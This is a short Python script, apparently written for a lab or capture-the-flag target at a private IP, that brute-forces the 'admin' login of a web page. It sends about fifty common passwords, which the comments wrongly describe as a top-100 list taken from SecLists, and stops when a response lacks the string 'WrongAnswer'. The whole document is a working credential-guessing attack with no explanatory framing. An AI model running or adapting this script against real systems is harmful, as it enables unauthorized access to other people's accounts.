#!/usr/bin/env python3
import requests

# Configuration
URL = "http://10.12.248.97/index.php"


# Top 100 des mots de passe les plus utilisés (source: SecLists)
PASSWORDS = [
    "123456", "password", "123456789", "12345", "12345678", 
    "qwerty", "1234567", "111111", "123123", "admin",
    "1234567890", "letmein", "welcome", "monkey", "password1",
    "abc123", "1234", "dragon", "shadow", "sunshine",
    "master", "football", "123456a", "123", "aaron431",
    "password123", "123456b", "123456", "qwerty123", "admin123",
    "welcome1", "1q2w3e4r", "123qwe", "654321", "555555",
    "lovely", "7777777", "123abc", "11111", "123321",
    "mustang", "access", "starwars", "baseball", "superman",
    "batman", "trustno1", "hello", "jordan23", "123456q"
]

# Bruteforce
print("Starting brute force attack...")
for pwd in PASSWORDS:
    try:
        r = requests.get(URL, params={
            "page": "signin",
            "username": "admin",
            "password": pwd,
            "Login": "Login"
        })
        
        if "WrongAnswer" not in r.text:
            print(f"\n[+] SUCCESS! Password found: {pwd}")
            print(f"Response length: {len(r.text)} characters")
            exit()
            
        print(f"Trying: {pwd.ljust(15)} | Status: {r.status_code}", end='\r')
        
    except Exception as e:
        print(f"\nError with {pwd}: {str(e)}")
        continue

print("\n[-] Attack completed. No password found.")
